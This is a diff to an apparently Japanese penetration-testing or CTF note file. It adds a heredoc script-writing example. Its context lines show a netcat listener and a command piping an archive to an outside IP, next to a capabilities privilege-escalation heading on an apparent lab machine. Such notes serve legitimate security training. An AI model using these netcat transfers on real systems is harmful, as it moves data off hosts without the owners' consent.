@@ -22,6 +22,14 @@ nc -lvnp 9999 > some-file-name.tar.gz
 ```sh
 nc 10.11.42.116 9999 < ff.tar.gz
 ```
+
+## ヒアドキュメントでスクリプトを書く
+```sh
+cat << EOF > test.sh
+#!/bin/sh
+id
+EOF
+```
 ## Capabilityを調べる
 ```sh
 david@nunchucks:/opt$ which perl
